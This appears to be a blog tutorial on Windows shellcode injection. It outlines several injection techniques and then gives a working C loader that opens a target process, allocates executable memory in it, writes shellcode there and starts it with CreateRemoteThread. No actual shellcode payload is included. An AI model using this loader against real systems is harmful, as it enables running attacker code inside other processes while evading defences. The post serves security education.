Shellcode is a snippet of machine code typically written in assembly language. It's designed to perform a specific task when executed, often granting the attacker control over the compromised system. 

Shellcode injection involves the insertion and execution of such malicious code within the memory space of a target process, bypassing traditional security measures.

# Techniques for Shellcode Injection

## 1. Process Injection:

   - **Remote Thread Injection**: This technique involves creating a remote thread in the target process and directing it to execute the shellcode.
   - **Process Hollowing**: In process hollowing, a legitimate process is spawned in a suspended state, its memory contents replaced with the attacker's shellcode, and then resumed to execute the malicious code.

## 2. Code Cave Injection:

   - **Code Cave**: A code cave refers to an unused or padding section of executable memory within a process. Attackers exploit these code caves to inject and execute their shellcode, often evading detection.
   - **Return-Oriented Programming (ROP)**: ROP chains leverage existing code fragments within a process, known as gadgets, to perform malicious operations. Attackers construct a sequence of gadgets that ultimately lead to the execution of the injected shellcode.

In this blog post we will cover the **Remote Thread Injection**. 

# Hands-On: Shellcode Injection with C Code Snippet 
## Understanding Shellcode Injection Process

Before delving into the code snippet, let's understand the purpose of each function used in the shellcode injection process and its significance within the attack:

1.   **Opening the Target Process**: Use [`OpenProcess`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) to open a handle to the target process identified by its process ID.
    
2.   **Memory Allocation**: Use [`VirtualAllocEx`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) to allocate memory within the address space of the target process.
    
3.   **Shellcode Injection**: Use [`WriteProcessMemory`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) to write the shellcode to the allocated memory within the target process.
    
4.   **Remote Thread Creation**: Use [`CreateRemoteThread`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread) to create a remote thread in the target process, specifying the entry point as the allocated memory containing the shellcode.
    
5.   **Cleanup**: Close handles and release allocated memory after the execution of the remote thread.

int main()
{
    // Open the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, <TARGET_PROCESS_ID>); // Replace <TARGET_PROCESS_ID> with the process ID of the target process
    if (hProcess == NULL) {
        printf("Failed to open target process. Error code: %d\n", GetLastError());
        return 1;
    }

    // Allocate memory within the target process
    LPVOID pAllocatedMemory = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pAllocatedMemory == NULL) {
        printf("Failed to allocate memory in target process. Error code: %d\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

    // Write the shellcode to the allocated memory in the target process
    if (!WriteProcessMemory(hProcess, pAllocatedMemory, shellcode, sizeof(shellcode), NULL)) {
        printf("Failed to write shellcode to target process. Error code: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pAllocatedMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Create a remote thread in the target process to execute the shellcode
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pAllocatedMemory, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create remote thread. Error code: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pAllocatedMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Wait for the remote thread to terminate
    WaitForSingleObject(hThread, INFINITE);

    // Clean up
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pAllocatedMemory, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return 0;
}

```


Remember to collect the desired PID of the process you want to inject the shellcode to and change it for the `<TARGET_PROCESS_ID>` variable in the OpenProcess() function call.
